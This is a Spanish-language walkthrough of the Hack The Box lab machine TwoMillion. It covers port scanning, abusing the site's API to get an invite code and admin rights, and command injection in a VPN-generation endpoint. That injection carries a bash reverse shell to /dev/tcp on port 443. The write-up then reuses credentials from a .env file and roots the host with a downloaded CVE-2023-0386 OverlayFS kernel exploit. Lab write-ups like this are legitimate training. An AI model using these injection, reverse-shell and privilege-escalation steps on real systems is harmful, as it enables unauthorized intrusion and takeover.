# Twomillions
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Twomillion.png" alt="Twomillion" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>Abusing declared Javascript functions from the browser console</li>
        <li>Abusing the API to generate a valid invite code</li>
        <li>Abusing the API to elevate our privilege to administrator</li>
        <li>Command injection via poorly designed API functionality</li>
        <li>Information Leakage</li>
        <li>Privilege Escalation via Kernel Exploitation (CVE-2023-0386) - OverlayFS Vulnerability</li>
      </ul>
    </td>
  </tr>
</table>


## Reconocimiento inicial
Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.221 -oG allports
```

```shell
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Vamos a realizar un escaneo más exaustivo de los siguiente puertos encontrados:


```shell
nmap -sCV -p21,22,80 10.10.11.221 -oN targeted
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 05:53 EDT
Nmap scan report for 10.10.11.221
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds
```

Vemos que no puede redireccionar a `http://2million.htb/`por lo tanto lo añadimos al `/etc/host`

Utilizamos la herramienta `whatweb` para ver si encontramos algo interesante en la página
```shell
http://2million.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx  
```
## Exploramos la pagina web

Nos encontramos un panel de login y un panel de unirte a nosostros en el que se redirige a /invite

si inspeccionamos los elementos podemos ver que hay una funcion para obtener un codigo de invitacion para ellos si en la consola ponemos `this` vemos que hay una función que se llama makeInviteCode() que tiene el siguiente contenido:

```
data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
​​
enctype: "ROT13"
```

Vemos que se encuentra cifrado en ROT13 si lo desciframos obtenemos lo siguiente: 

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Usando curl podemos generar un codigo haciendo la peticion de POST a esa url por lo tanto

```shell
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "VlY2NDUtWktXTEctWkRWUFEtUVYxNjI=",
    "format": "encoded"
}
```
DE nuevo vemos que el codigo se encunetra en `base64` si lo decodificamos obtenemos lo siguiente:
```
VV645-ZKWLG-ZDVPQ-QV162
```

A partir de este código podemos crear una cuenta.


## Intrusion a la máquina

Una vez que accedemos vemos que nos encontramos un enlace para regenerar nuestra vpn que nos lleva a un enlace sospechososutilizando la api es por ello que si hacemos una peticion curl hacia ese endpoint obtnemos varios enlaces interesantes

```shell
curl -s -X GET "http://2million.htb/api/v1" -H "Cookie:PHPSESSID=d897e71qbsq1uhh8g116bvpb8t" | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Vemos que con el ultimo método podemos intentar cambiar los privilegios de un usuario mediante `PUT`

Es por ello que vamos a ir probando: 

```shell
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie:PHPSESSID=d897e71qbsq1uhh8g116bvpb8t" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
```

```shell
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie:PHPSESSID=d897e71qbsq1uhh8g116bvpb8t" -H "Content-Type:application/json" | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

```shell
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie:PHPSESSID=d897e71qbsq1uhh8g116bvpb8t" -H "Content-Type:application/json" -d '{"email":"fer@fer.com"}' | jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

```shell
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie:PHPSESSID=d897e71qbsq1uhh8g116bvpb8t" -H "Content-Type:application/json" -d '{"email":"fer@fer.com","is_admin":1}' | jq 
{
  "id": 13,
  "username": "fer",
  "is_admin": 1
}

```

Finalmente hemos obtneido que el ususario que hemos creado tenga los privilegios de ser admin.

Ahora podemos intenetar colar algun comando a la hora de generar la vpn para ello utilizamos el siguiente comando:
```shell
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie:PHPSESSID=d897e71qbsq1uhh8g116bvpb8t" -H "Content-Type: application/json" -d '{"username":"test;whoami;"}' 
```
Vemos como obtenemos el usuario actual `www-data` 

Por lo tanto vamos a intentar establecer una rever shell en unestro puerto 443
```shell
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie:PHPSESSID=d897e71qbsq1uhh8g116bvpb8t" -H "Content-Type: application/json" -d '{"username":"test;bash -c \"bash -i >& /dev/tcp/IP/443 0>&1\";"}' 
```

## Pivotar al usuario admin

Tras hacer el tratamiento de la terminal para que sea más intercativa y explorar los ficheros que tenemos vemos que existe un `Database.php` normalmente en este fichero estan incrustados los ususarios y las contraseñas sin embargo no encontramos nada relevante.es por ello que realizado el comando `ls -la`por si habia ficheros que estuvieran ocultos.

Encontramos un fichero `.env` que muestra un ususario y una contraseña:

```shell
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Comprobamos si podemos acceder al servicio `ssh` usando ese usuario y contraseña

```shell
ssh admin@10.10.11.221
```
## Escalada de privilegios 
Para la escalada de priviligios tras realizar los comandos habituales para ver permisos ,
ver las capabilities etc no encontramos nada, sin embargo nos encontramos que hay un email que nos da una pista:

```shell
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

```
## Escalada de privilegios

Vemos que esta maquina es vulnerable a CVE- 2023-0386 que se produce en OverlayFS por lo tanto buscamos un POC que lo explote en github.
```
https://github.com/puckiestyle/CVE-2023-0386
```

nos creamos un servido en el puerto 80 para pasar el CVE de nuestra máquina a la maquina víctima

```shell
python3 -m http.server 80
```
y nos lo traemos con 
```shell
wget http://10.10.14.8/comprimido.zip
```

Finalemnte siguiendo la guia de instalación obtnemos una shell con privilegios y la última flag.

